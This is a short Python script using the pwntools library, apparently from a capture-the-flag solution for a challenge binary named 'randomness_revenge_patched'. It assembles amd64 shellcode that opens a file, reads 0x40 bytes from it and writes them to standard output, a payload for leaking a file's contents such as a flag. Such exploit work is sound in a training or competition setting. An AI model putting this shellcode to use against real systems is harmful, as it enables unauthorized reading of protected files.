from pwn import *

exe = ELF('randomness_revenge_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


pa = asm("mov r15, rsi"+shellcraft.amd64.linux.syscall('SYS_openat', 0, 'r15', 0, 0) +
        shellcraft.amd64.linux.syscall('SYS_read', 'rax', 'r15', 0x40) +
        shellcraft.amd64.linux.syscall('SYS_write', 1, 'r15', 0x40))
print(pa)